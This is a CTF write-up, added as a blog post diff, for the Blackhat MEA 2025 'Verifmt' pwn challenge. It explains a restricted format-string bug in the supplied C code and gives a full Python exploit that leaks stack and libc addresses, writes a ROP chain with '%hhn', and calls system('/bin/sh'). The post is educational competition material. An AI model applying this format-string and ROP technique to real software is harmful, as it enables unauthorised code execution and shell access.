@@ -1,0 +1,295 @@
+---
+title: Blackhat MEA '25  - PWN - Verifmt
+date: '2025-12-18'
+tags: ['ctf', 'pwn', 'bhmea', 'fmt', 'ROP']
+draft: false
+summary: Exploitation a restricted format string vulnerability to get memory disclosures and performing ROP afterwards.
+---
+
+## Solution 
+
+Files provided:
+
+```bash
+$ unzip -l Verifmt.zip
+Archive:  Verifmt.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+     1449  2025-12-02 00:57   main.c
+    16440  2025-12-02 00:57   chall
+      117  2025-12-02 00:57   compose.yml
+      337  2025-12-02 00:57   Dockerfile
+---------                     -------
+    18343                     4 files
+```
+
+Following is the challenge C code:
+
+```c:main.c
+#include <ctype.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int verify_fmt(const char *fmt, size_t n_args) {
+  size_t argcnt = 0;
+  size_t len = strlen(fmt);
+
+  for (size_t i = 0; i < len; i++) {
+    if (fmt[i] == '%') {
+      if (fmt[i+1] == '%') {
+        i++;
+        continue;
+      }
+
+      if (isdigit(fmt[i+1])) {
+        puts("[-] Positional argument not supported");
+        return 1;
+      }
+
+      if (argcnt >= n_args) {
+        printf("[-] Cannot use more than %lu specifiers\n", n_args);
+        return 1;
+      }
+
+      argcnt++;
+    }
+  }
+
+  return 0;
+}
+
+int main() {
+  size_t n_args;
+  long args[4];
+  char fmt[256];
+
+  setbuf(stdin, NULL);
+  setbuf(stdout, NULL);
+
+  while (1) {
+    /* Get arguments */
+    printf("# of args: ");
+    if (scanf("%lu", &n_args) != 1) {
+      return 1;
+    }
+
+    if (n_args > 4) {
+      puts("[-] Maximum of 4 arguments supported");
+      continue;
+    }
+
+    memset(args, 0, sizeof(args));
+    for (size_t i = 0; i < n_args; i++) {
+      printf("args[%lu]: ", i);
+      if (scanf("%ld", args + i) != 1) {
+        return 1;
+      }
+    }
+
+    /* Get format string */
+    while (getchar() != '\n');
+    printf("Format string: ");
+    if (fgets(fmt, sizeof(fmt), stdin) == NULL) {
+      return 1;
+    }
+
+    /* Verify format string */
+    if (verify_fmt(fmt, n_args)) {
+      continue;
+    }
+
+    /* Enjoy! */
+    printf(fmt, args[0], args[1], args[2], args[3]);
+  }
+
+  return 0;
+}
+```
+
+**ptr yodai** gave straight forward bug in all the pwn challenges of BHMEA 25. But exploitation part was very tricky. 
+In this challenge, we are given a binary that takes number of arguments (max 4) and their values, then a format string. 
+It verifies if the format string contains more format specifiers than the number of arguments provided. If it does, 
+it rejects the input. If not, it directly passes the format string and arguments to `printf()`.
+The verification function also rejects positional format specifiers (like `%1$lx`) and allows `%%` to print a single `%`.
+
+Code also does `memset()` of args to 0 before taking input, so if we provide less than 4 arguments, the rest will be 0.
+
+Now, to get a memory leak using format string vulnerability, we need to be able to read arbitrary stack addresses by moving forward 
+from the 4rd argument (as first 4 arguments will be nulled if we provide less than 4 args). But since we cannot use positional 
+specifiers, we cannot directly access those stack addresses. So, we need to find a way to move the stack pointer forward.
+
+If you are not fimilar with how format string vulnerabilities work there is a specifiers `%.*s` which takes two arguments: 
+an integer `n` and a string pointer `s`, and prints `n` bytes from the string `s`. This specifier moves the stack pointer forward
+by 2 arguments. So, we can use multiple `%.*s` specifiers to move the stack pointer forward until we reach the desired address.
+
+So first we need to leak a stack address to calculate offset to such a stack address that stores a libc address. We can do this 
+by using `%p` specifier after moving the stack pointer forward by 3 `%.*s` specifiers (as we have 4 arguments, we can move forward 
+by 3*2=6 arguments).
+
+The format string would look something like this:
+```c 
+%.*s%.*s%.*s%p
+```
+
+This will print 3 strings (which we don't care as the `%s` specifier is not pointing to any string because our main goal is to move 
+the format string buffer pointer ahead) and then print a stack address:
+
+![stack-leak](/static/writeups/bhmea-25/pwn/verifmt/stack-leak.png)
+
+
+Now, we can just calculate the offset to a stack address that stores a libc address. I am choosing this one as it is closer to our 
+stack leak:
+
+![stack-leak](/static/writeups/bhmea-25/pwn/verifmt/offset.png)
+
+Offset:
+
+```py
+pwndbg> p/x 0x7fff53a58848 - 0x7fff53a587d0
+$1 = 0x78
+```
+
+Now I will send stack-0x78 as first argument and use `%s` specifier to read the libc address from that stack address. Format string
+would be:
+
+```c
+%s, <stackLeak - 0x78>
+```
+
+Exploit so far:
+```py:payload.py
+#!/usr/bin/env python3
+from flashlib import *
+
+gdbscript = """
+    b *main+291
+"""
+
+init("./chall")
+attach(gdbscript) if args.GDB else None
+
+def sendArgs(no_of_args, arg0, arg1, arg2, arg3):
+    io.sendlineafter(b"# of args: ", encode(no_of_args))
+    io.sendlineafter(b"args[0]: ", encode(arg0))
+    io.sendlineafter(b"args[1]: ", encode(arg1))
+    io.sendlineafter(b"args[2]: ", encode(arg2))
+    io.sendlineafter(b"args[3]: ", encode(arg3))
+
+
+sendArgs(4, 0x4, 0, 0, 0)
+
+''' stack leak '''
+io.sendlineafter(b"string: ", b"%.*s%.*s%.*s%p")
+stack = hexleak(io.recvline())
+logleak(stack)
+
+''' libc leak '''
+sendArgs(4, stack-0x78, 0, 0, 0)
+io.sendlineafter(b"string: ", b"%s")
+```
+
+And we got a libc leak:
+
+![stack-leak](/static/writeups/bhmea-25/pwn/verifmt/libc-leak.png)
+
+We can fix this leak by using `fixleak()` function from **flashlib** and can calculate libc base address by subtracting offset of 
+`_IO_2_1_stdin_` from the leak as we already know its a `_IO_2_1_stdin_` address from gdb p2p command output from screenshot above.
+
+```py:payload.py
+#!/usr/bin/env python3
+from flashlib import *
+
+gdbscript = """
+    b *main+291
+"""
+
+init("./chall")
+attach(gdbscript) if args.GDB else None
+
+def sendArgs(no_of_args, arg0, arg1, arg2, arg3):
+    io.sendlineafter(b"# of args: ", encode(no_of_args))
+    io.sendlineafter(b"args[0]: ", encode(arg0))
+    io.sendlineafter(b"args[1]: ", encode(arg1))
+    io.sendlineafter(b"args[2]: ", encode(arg2))
+    io.sendlineafter(b"args[3]: ", encode(arg3))
+
+
+sendArgs(4, 0x4, 0, 0, 0)
+
+''' stack leak '''
+io.sendlineafter(b"string: ", b"%.*s%.*s%.*s%p")
+stack = hexleak(io.recvline())
+logleak(stack)
+
+''' libc leak '''
+sendArgs(4, stack-0x78, 0, 0, 0)
+io.sendlineafter(b"string: ", b"%s")
+
+libc.address = fixleak(io.recv(6)) - libc.sym._IO_2_1_stdin_
+logleak(libc.address)
+```
+
+![stack-leak](/static/writeups/bhmea-25/pwn/verifmt/libc-fixed-leak.png)
+
+Now rest of the part is pretty straight forward, write ROP on the main function's return address and get a shell:
+
+```py:payload.py
+#!/usr/bin/env python3
+from flashlib import *
+
+gdbscript = """
+    b *main+291
+"""
+
+init("./chall")
+attach(gdbscript) if args.GDB else None
+
+def sendArgs(no_of_args, arg0, arg1, arg2, arg3):
+    io.sendlineafter(b"# of args: ", encode(no_of_args))
+    io.sendlineafter(b"args[0]: ", encode(arg0))
+    io.sendlineafter(b"args[1]: ", encode(arg1))
+    io.sendlineafter(b"args[2]: ", encode(arg2))
+    io.sendlineafter(b"args[3]: ", encode(arg3))
+
+def writeLong(address, val):
+    for i in range(8):
+        byte_val = (val >> (i * 8)) & 0xff
+        io.sendlineafter(b"# of args:", b'2')
+        io.sendlineafter(b"args[0]: ", encode(address + i))
+        io.sendlineafter(b"args[1]: ", b"0")
+        io.sendlineafter(b"string: ", b"A" * byte_val + b"%hhn")
+
+
+sendArgs(4, 0x4, 0, 0, 0)
+
+''' stack leak '''
+io.sendlineafter(b"string: ", b"%.*s%.*s%.*s%p")
+stack = hexleak(io.recvline())
+logleak(stack)
+
+''' libc leak '''
+sendArgs(4, stack-0x78, 0, 0, 0)
+io.sendlineafter(b"string: ", b"%s")
+libc.address = fixleak(io.recv(6)) - libc.sym._IO_2_1_stdin_
+logleak(libc.address)
+
+RSP = stack + 0x170
+logleak(RSP)
+
+POP_RDI = libc.address + 0x000000000010f78b
+BIN_SH = libc.address +0x1cb42f
+
+writeLong(RSP, POP_RDI)
+writeLong(RSP+0x8, BIN_SH)
+writeLong(RSP+0x10, POP_RDI+1)  # ret
+writeLong(RSP+0x18, libc.sym.system)
+
+io.sendlineafter(b"args: ", b"-")   # triggering return from main function
+
+io.interactive()
+```
+
+Shell:
+
+![stack-leak](/static/writeups/bhmea-25/pwn/verifmt/shell.png)
